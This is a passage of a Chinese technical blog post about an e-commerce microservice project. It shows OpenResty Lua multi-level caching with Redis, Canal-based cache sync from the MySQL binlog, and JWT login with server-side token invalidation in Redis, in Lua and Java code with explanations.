class="keyword">not</span> ok <span class="keyword">then</span>  </span><br><span class="line">        ngx_log(ngx_ERR, <span class="string">&quot;set redis keepalive error : &quot;</span>, err)  </span><br><span class="line">    <span class="keyword">end</span>  </span><br><span class="line"><span class="keyword">end</span>  </span><br><span class="line"><span class="comment">-- 查询本地缓存，没有则查询redis, ip和port是redis地址，key是查询的key</span></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">read_cache</span><span class="params">(ip, port, key)</span></span> </span><br><span class="line">	<span class="comment">-- 尝试读本地缓存</span></span><br><span class="line">	<span class="keyword">local</span> resp = cache_get(key)</span><br><span class="line">	<span class="comment">-- ngx_log(ngx_ERR, &quot;debug local cache data : &quot;, resp) </span></span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> resp <span class="keyword">then</span></span><br><span class="line">		ngx_log(ngx_ERR, <span class="string">&quot;read local cache fail , key&quot;</span>, key)</span><br><span class="line">		<span class="comment">-- 获取一个redis连接</span></span><br><span class="line">		<span class="keyword">local</span> red = redis:new()  </span><br><span class="line">		red:set_timeout(<span class="number">1000</span>)  </span><br><span class="line">		<span class="keyword">local</span> ok, err = red:connect(ip, port)  </span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> ok <span class="keyword">then</span>  </span><br><span class="line">			ngx_log(ngx_ERR, <span class="string">&quot;connect to redis error : &quot;</span>, err)  </span><br><span class="line">			<span class="keyword">return</span> close_redis(red)  </span><br><span class="line">		<span class="keyword">end</span></span><br><span class="line">		<span class="comment">-- 利用get查询</span></span><br><span class="line">		resp, err = red:get(key) </span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line">	<span class="comment">-- 查询失败处理</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> resp <span class="keyword">then</span>  </span><br><span class="line">        ngx_log(ngx_ERR, <span class="string">&quot;get redis content error : &quot;</span>, err)  </span><br><span class="line">        <span class="keyword">return</span> close_redis(red)  </span><br><span class="line">    <span class="keyword">end</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">--得到的数据为空处理  </span></span><br><span class="line">    <span class="keyword">if</span> resp == ngx.null <span class="keyword">then</span>  </span><br><span class="line">        resp = <span class="literal">nil</span>  </span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">	cache_set(key, resp)</span><br><span class="line">    close_redis(red)  </span><br><span class="line">    <span class="keyword">return</span> resp  </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- 查询redis的方法 ip和port是redis地址，keys是查询的key，数组格式</span></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">read_redis</span><span class="params">(ip, port, key)</span></span>  </span><br><span class="line">	<span class="comment">-- 获取一个连接</span></span><br><span class="line">    <span class="keyword">local</span> red = redis:new()  </span><br><span class="line">    red:set_timeout(<span class="number">1000</span>)  </span><br><span class="line">    <span class="keyword">local</span> ok, err = red:connect(ip, port)  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ok <span class="keyword">then</span>  </span><br><span class="line">        ngx_log(ngx_ERR, <span class="string">&quot;connect to redis error : &quot;</span>, err)  </span><br><span class="line">        <span class="keyword">return</span> close_redis(red)  </span><br><span class="line">    <span class="keyword">end</span>  </span><br><span class="line">    <span class="keyword">local</span> resp = <span class="literal">nil</span></span><br><span class="line">	<span class="comment">-- 利用get查询 </span></span><br><span class="line">    resp, err = red:get(key)  </span><br><span class="line">	<span class="comment">-- 查询失败处理</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> resp <span class="keyword">then</span>  </span><br><span class="line">        ngx_log(ngx_ERR, <span class="string">&quot;get redis content error : &quot;</span>, err)  </span><br><span class="line">        <span class="keyword">return</span> close_redis(red)  </span><br><span class="line">    <span class="keyword">end</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">--得到的数据为空处理  </span></span><br><span class="line">    <span class="keyword">if</span> resp == ngx.null <span class="keyword">then</span>  </span><br><span class="line">        resp = <span class="literal">nil</span>  </span><br><span class="line">    <span class="keyword">end</span>  </span><br><span class="line">    close_redis(red)  </span><br><span class="line">    <span class="keyword">return</span> resp  </span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"><span class="comment">-- 查询http请求的方法，path是请求路径，args是参数，table格式</span></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">read_http</span><span class="params">(path, args)</span></span> </span><br><span class="line">	<span class="comment">-- 默认查询地址走 /backend/page/,内部转发到8083端口</span></span><br><span class="line">    <span class="keyword">local</span> resp = ngx.location.capture(<span class="string">&quot;/backend/page&quot;</span>..<span class="built_in">path</span>, &#123;  </span><br><span class="line">        method = ngx.HTTP_GET,  </span><br><span class="line">        args = args  </span><br><span class="line">    &#125;)  </span><br><span class="line">	<span class="comment">-- 查询失败的处理</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> resp <span class="keyword">then</span>  </span><br><span class="line">        ngx_log(ngx_ERR, <span class="string">&quot;request error&quot;</span>)  </span><br><span class="line">        <span class="keyword">return</span>  </span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">	<span class="comment">-- 返回状态码不是200就报错</span></span><br><span class="line">    <span class="keyword">if</span> resp.<span class="built_in">status</span> ~= <span class="number">200</span> <span class="keyword">then</span>  </span><br><span class="line">        ngx_log(ngx_ERR, <span class="string">&quot;request error, status :&quot;</span>, resp.<span class="built_in">status</span>)  </span><br><span class="line">        <span class="keyword">return</span>  </span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> resp.body  </span><br><span class="line"><span class="keyword">end</span>  </span><br><span class="line"><span class="comment">-- 将方法导出</span></span><br><span class="line"><span class="keyword">local</span> _M = &#123;  </span><br><span class="line">    read_redis = read_redis,  </span><br><span class="line">    read_cache = read_cache,  </span><br><span class="line">    read_http = read_http  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">return</span> _M </span><br></pre></td></tr></table></figure>



<p>改造<code>item.lua</code>，将分类、品牌、规格查询走本地缓存</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 导入模块</span></span><br><span class="line"><span class="keyword">local</span> common = <span class="built_in">require</span>(<span class="string">&quot;common&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> read_redis = common.read_redis  </span><br><span class="line"><span class="keyword">local</span> read_http = common.read_http</span><br><span class="line"><span class="keyword">local</span> read_cache = common.read_cache</span><br><span class="line"><span class="keyword">local</span> cjson = <span class="built_in">require</span>(<span class="string">&quot;cjson&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> template = <span class="built_in">require</span>(<span class="string">&quot;resty.template&quot;</span>)  </span><br><span class="line"><span class="comment">-- 常用变量和方法</span></span><br><span class="line"><span class="keyword">local</span> ngx_log = ngx.<span class="built_in">log</span>  </span><br><span class="line"><span class="keyword">local</span> ngx_ERR = ngx.ERR  </span><br><span class="line"><span class="keyword">local</span> ngx_exit = ngx.<span class="built_in">exit</span>  </span><br><span class="line"><span class="keyword">local</span> ngx_print = ngx.<span class="built_in">print</span>  </span><br><span class="line"><span class="keyword">local</span> ngx_re_match = ngx.re.<span class="built_in">match</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取商品id</span></span><br><span class="line"><span class="keyword">local</span> spuId = ngx.var.spuId</span><br><span class="line"><span class="comment">-- 获取spu</span></span><br><span class="line"><span class="keyword">local</span> spuKey = <span class="string">&quot;page:spu:id:&quot;</span>..spuId </span><br><span class="line"><span class="keyword">local</span> spuInfoStr = read_redis(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>, spuKey)  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> spuInfoStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;redis not found spu info, back to http, spuId : &quot;</span>, spuId)  </span><br><span class="line">   spuInfoStr = read_http(<span class="string">&quot;/spu/&quot;</span>..spuId, &#123;&#125;)  </span><br><span class="line"><span class="keyword">end</span>  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> spuInfoStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;http not found spuInfoStr info, spuId : &quot;</span>, spuId)  </span><br><span class="line">   <span class="keyword">return</span> ngx_exit(<span class="number">404</span>)  </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取sku</span></span><br><span class="line"><span class="keyword">local</span> skuKey = <span class="string">&quot;page:sku:id:&quot;</span>..spuId </span><br><span class="line"><span class="keyword">local</span> skuInfoStr = read_redis(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>, skuKey)  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> skuInfoStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;redis not found sku info, back to http, spuId : &quot;</span>, spuId)  </span><br><span class="line">   skuInfoStr = read_http(<span class="string">&quot;/sku/&quot;</span>..spuId, &#123;&#125;)  </span><br><span class="line"><span class="keyword">end</span>  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> skuInfoStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;http not found skuInfoStr info, spuId : &quot;</span>, spuId)  </span><br><span class="line">   <span class="keyword">return</span> ngx_exit(<span class="number">404</span>)  </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- 获取spuDetail</span></span><br><span class="line"><span class="keyword">local</span> detailKey = <span class="string">&quot;page:detail:id:&quot;</span>..spuId </span><br><span class="line"><span class="keyword">local</span> detailInfoStr = read_redis(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>, detailKey)  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> detailInfoStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;redis not found detail info, back to http, spuId : &quot;</span>, spuId)  </span><br><span class="line">   detailInfoStr = read_http(<span class="string">&quot;/detail/&quot;</span>..spuId, &#123;&#125;)  </span><br><span class="line"><span class="keyword">end</span>  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> detailInfoStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;http not found detailInfoStr info, spuId : &quot;</span>, spuId)  </span><br><span class="line">   <span class="keyword">return</span> ngx_exit(<span class="number">404</span>)  </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- 获取categories</span></span><br><span class="line"><span class="keyword">local</span> spuInfo = cjson.decode(spuInfoStr)  </span><br><span class="line"><span class="keyword">local</span> cid3 = spuInfo[<span class="string">&quot;categoryIds&quot;</span>][<span class="number">3</span>]</span><br><span class="line"><span class="keyword">local</span> categoryKey = <span class="string">&quot;page:category:id:&quot;</span>..cid3 </span><br><span class="line"><span class="keyword">local</span> categoryStr = read_cache(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>, categoryKey)  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> categoryStr <span class="keyword">then</span>  </span><br><span class="line">   <span class="keyword">local</span> idStr = <span class="built_in">table</span>.<span class="built_in">concat</span>(spuInfo[<span class="string">&quot;categoryIds&quot;</span>],<span class="string">&quot;,&quot;</span>);</span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;redis not found category info, back to http, categoryIds : &quot;</span>, idStr)  </span><br><span class="line">   categoryStr = read_http(<span class="string">&quot;/categories/&quot;</span>, &#123;ids  = idStr&#125;)</span><br><span class="line"><span class="keyword">end</span>  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> categoryStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;http not found categoryStr info, categoryId : &quot;</span>, cid3)  </span><br><span class="line">   <span class="keyword">return</span> ngx_exit(<span class="number">404</span>)  </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- 获取品牌  </span></span><br><span class="line"><span class="keyword">local</span> brandId = spuInfo[<span class="string">&quot;brandId&quot;</span>]</span><br><span class="line"><span class="keyword">local</span> brandKey = <span class="string">&quot;page:brand:id:&quot;</span>..brandId </span><br><span class="line"><span class="keyword">local</span> brandStr = read_cache(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>, brandKey)  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> brandStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;redis not found brand info, back to http, brandId : &quot;</span>, brandId)  </span><br><span class="line">   brandStr = read_http(<span class="string">&quot;/brand/&quot;</span>..brandId, &#123;&#125;)</span><br><span class="line"><span class="keyword">end</span>  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> brandStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;http not found brandStr info, brandId : &quot;</span>, brandId)  </span><br><span class="line">   <span class="keyword">return</span> ngx_exit(<span class="number">404</span>)  </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- 获取规格</span></span><br><span class="line"><span class="keyword">local</span> specKey = <span class="string">&quot;page:spec:id:&quot;</span>..cid3 </span><br><span class="line"><span class="keyword">local</span> specStr = read_cache(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>, specKey)  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> specStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;redis not found spec info, back to http, cid3 : &quot;</span>, cid3)  </span><br><span class="line">   specStr = read_http(<span class="string">&quot;/spec/&quot;</span>..cid3, &#123;&#125;)</span><br><span class="line"><span class="keyword">end</span>  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> specStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;http not found specStr info, cid3 : &quot;</span>, cid3)  </span><br><span class="line">   <span class="keyword">return</span> ngx_exit(<span class="number">404</span>)  </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- 组织数据1</span></span><br><span class="line"><span class="keyword">local</span> context = &#123;</span><br><span class="line">	name = spuInfo[<span class="string">&quot;name&quot;</span>],</span><br><span class="line">	skuList =  skuInfoStr,</span><br><span class="line">	detail =  detailInfoStr,</span><br><span class="line">	categories =  categoryStr,</span><br><span class="line">	brand =  brandStr,</span><br><span class="line">	specs =  specStr</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">--渲染模板  1</span></span><br><span class="line">template.render(<span class="string">&quot;item.html&quot;</span>, context)  </span><br></pre></td></tr></table></figure>

<h3 id="Canal实现缓存数据同步"><a href="#Canal实现缓存数据同步" class="headerlink" title="Canal实现缓存数据同步"></a>Canal实现缓存数据同步</h3><p>MySQL主备复制原理</p>
<ul>
<li>MySQL master 将<strong>数据变更</strong>写入二进制日志( binary log, 其中记录叫做二进制日志事件binary log events，可以通过 show binlog events 进行查看)</li>
<li>MySQL slave 将 master 的 binary log events 拷贝到它的中继日志(relay log)</li>
<li>MySQL slave 重放 relay log 中事件，将数据变更反映它自己的数据</li>
</ul>
<p>canal 工作原理</p>
<ul>
<li>canal 模拟 MySQL slave 的交互协议，伪装自己为 MySQL slave ，向 MySQL master 发送dump 协议</li>
<li>MySQL master 收到 dump 请求，开始推送 binary log 给 slave (即 canal )</li>
<li>Canal 解析 binary log 对象(原始为 byte 流)</li>
</ul>
<h4 id="关键代码："><a href="#关键代码：" class="headerlink" title="关键代码："></a>关键代码：</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.page.canal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.page.service.PageService;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> top.javatool.canal.client.annotation.CanalTable;</span><br><span class="line"><span class="keyword">import</span> top.javatool.canal.client.context.CanalContext;</span><br><span class="line"><span class="keyword">import</span> top.javatool.canal.client.handler.EntryHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-06-04 2:52 下午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@CanalTable(value = &quot;all&quot;)</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CanalHandler</span> <span class="keyword">implements</span> <span class="title class_">EntryHandler</span>&lt;Map&lt;String, String&gt;&gt;&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> PageService pageService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CanalHandler</span><span class="params">(PageService pageService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.pageService = pageService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">(Map&lt;String,String&gt; model)</span> &#123;</span><br><span class="line">        <span class="comment">// 获取表的名称</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">table</span> <span class="operator">=</span> CanalContext.getModel().getTable();</span><br><span class="line">        <span class="comment">// 如果表是tb_sku</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;tb_sku&quot;</span>.equals(table))&#123;</span><br><span class="line">            log.info(<span class="string">&quot;sku新增了&#123;&#125;&quot;</span>, model);</span><br><span class="line">            pageService.loadSkuListData(Long.valueOf(model.get(<span class="string">&quot;spu_id&quot;</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">(Map&lt;String,String&gt; before, Map&lt;String,String&gt; after)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">table</span> <span class="operator">=</span> CanalContext.getModel().getTable();</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;tb_sku&quot;</span>.equals(table))&#123;</span><br><span class="line">            log.info(<span class="string">&quot;sku修改了&#123;&#125;&quot;</span>, after);</span><br><span class="line">            pageService.loadSkuListData(Long.valueOf(after.get(<span class="string">&quot;spu_id&quot;</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">(Map&lt;String,String&gt; model)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">table</span> <span class="operator">=</span> CanalContext.getModel().getTable();</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;tb_sku&quot;</span>.equals(table))&#123;</span><br><span class="line">            log.info(<span class="string">&quot;sku删除了&#123;&#125;&quot;</span>, model);</span><br><span class="line">            pageService.deleteSku(Long.valueOf(model.get(<span class="string">&quot;spu_id&quot;</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="JWT登陆实现"><a href="#JWT登陆实现" class="headerlink" title="JWT登陆实现"></a>JWT登陆实现</h2><p>用户授权直接在网关做，如果在每个微服务单独做权限控制，每个微服务上的权限代码就会有重复。</p>
<p>流程图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120506.png" alt="image-20210704023834746"></p>
<p>权限控制流程：</p>
<ul>
<li><p>获取用户的登陆凭证jwt</p>
</li>
<li><p>解析jwt，获取用户身份</p>
<ul>
<li>如果解析失败，证明没有登陆，返回401</li>
</ul>
</li>
<li><p>根据身份，查询用户权限信息</p>
</li>
<li><p>获取当前请求资源（微服务接口路径）</p>
</li>
<li><p>判断是否有访问的资源的权限（通过则放行，不通过则返回401）</p>
</li>
</ul>
<h3 id="Token失效问题具体实现"><a href="#Token失效问题具体实现" class="headerlink" title="Token失效问题具体实现"></a>Token失效问题具体实现</h3><p>JWT的无法修改特性。因此<strong>我们不能修改token来标记token无效，而是在服务端记录token状态</strong>，于是就违背了无状态性的特性。</p>
<p>实现思路如下：</p>
<ul>
<li>用户登陆后，生成JWT，其中包含用户身份、JWT的ID（JTI）</li>
<li>以用户id为key，把JWT的id存入redis，只有redis中有的JWT，才是有效的JWT</li>
<li>并且给Redis中的用户id设置有效期，设置为30分钟，有效期到自动删除，登陆失效</li>
<li>退出登陆的时候，把JTI从Redis删除，把JWT从cookie中删除即可。</li>
</ul>
<p>流程图如下：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120507.png" alt="image-20210704024901219"></p>
<p>具体代码实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.auth.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.auth.config.JwtProperties;</span><br><span class="line"><span class="keyword">import</span> com.leyou.auth.service.UserAuthService;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.constants.BaseRedisConstants;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.Payload;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.UserInfo;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.exception.LyException;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.CookieUtils;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.JwtUtils;</span><br><span class="line"><span class="keyword">import</span> com.leyou.user.client.UserClient;</span><br><span class="line"><span class="keyword">import</span> com.leyou.user.dto.UserDTO;</span><br><span class="line"><span class="keyword">import</span> feign.FeignException;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.JwtException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.StringRedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.leyou.common.constants.BaseTokenConstants.COOKIE_NAME;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.leyou.common.constants.BaseTokenConstants.DOMAIN;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-06-06 9:05 下午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserAuthServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserAuthService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserClient userClient;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> JwtProperties jwtProperties;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> StringRedisTemplate redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserAuthServiceImpl</span><span class="params">(UserClient userClient, JwtProperties jwtProperties, StringRedisTemplate redisTemplate)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userClient = userClient;</span><br><span class="line">        <span class="built_in">this</span>.jwtProperties = jwtProperties;</span><br><span class="line">        <span class="built_in">this</span>.redisTemplate = redisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">login</span><span class="params">(String username, String password, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isEmpty(username) || StringUtils.isEmpty(password)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;用户名或密码不能为空&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.查询用户</span></span><br><span class="line">        <span class="type">UserDTO</span> <span class="variable">userDTO</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            userDTO = userClient.queryUserByUsernameAndPassword(username, password);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FeignException e) &#123;</span><br><span class="line">            <span class="comment">// 捕捉feign的异常，并获取feign调用状态码和异常信息</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(e.status(), e.contentUTF8(), e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 2.判断查询结果</span></span><br><span class="line">        <span class="keyword">if</span> (userDTO == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;用户名或密码错误&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 3.生成token</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">jti</span> <span class="operator">=</span> JwtUtils.createJTI();</span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> JwtUtils.generateTokenWithJTI(<span class="keyword">new</span> <span class="title class_">UserInfo</span>(userDTO.getId(), username, <span class="literal">null</span>)</span><br><span class="line">                , jti, jwtProperties.getPrivateKey());</span><br><span class="line">        <span class="comment">// 4.将jti存入redis</span></span><br><span class="line">        redisTemplate.opsForValue().set(BaseRedisConstants.JTI_KEY_PREFIX + userDTO.getId(), jti,</span><br><span class="line">                BaseRedisConstants.TOKEN_EXPIRE_MINUTES, TimeUnit.MINUTES);</span><br><span class="line">        <span class="comment">// 5.写入cookie</span></span><br><span class="line">        <span class="comment">// &quot;/&quot;代表一切路径都有效</span></span><br><span class="line">        CookieUtils.builder(response)</span><br><span class="line">                .domain(DOMAIN)</span><br><span class="line">                .maxAge(-<span class="number">1</span>)</span><br><span class="line">                .path(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">                .httpOnly(<span class="literal">true</span>)</span><br><span class="line">                .build(COOKIE_NAME, token);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">verify</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">        <span class="comment">// 1.获取cookie</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> CookieUtils.getCookieValue(request, COOKIE_NAME);</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isEmpty(token)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">401</span>, <span class="string">&quot;用户未登录或者超时&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 2.验证cookie的正确性</span></span><br><span class="line">        Payload&lt;UserInfo&gt; payload = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            payload = JwtUtils.getInfoFromToken(token, jwtProperties.getPublicKey(), UserInfo.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (JwtException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">401</span>, <span class="string">&quot;用户未登录或者不存在&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//3.获取cookie中的username</span></span><br><span class="line">        <span class="type">UserInfo</span> <span class="variable">userInfo</span> <span class="operator">=</span> payload.getUserInfo();</span><br><span class="line">        <span class="keyword">if</span> (userInfo == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">401</span>, <span class="string">&quot;用户未登录或者不存在&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jti</span> <span class="operator">=</span> redisTemplate.opsForValue().get(BaseRedisConstants.JTI_KEY_PREFIX + userInfo.getId());</span><br><span class="line">        <span class="keyword">if</span> (!StringUtils.equals(jti, payload.getId())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">401</span>, <span class="string">&quot;登录失效&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> 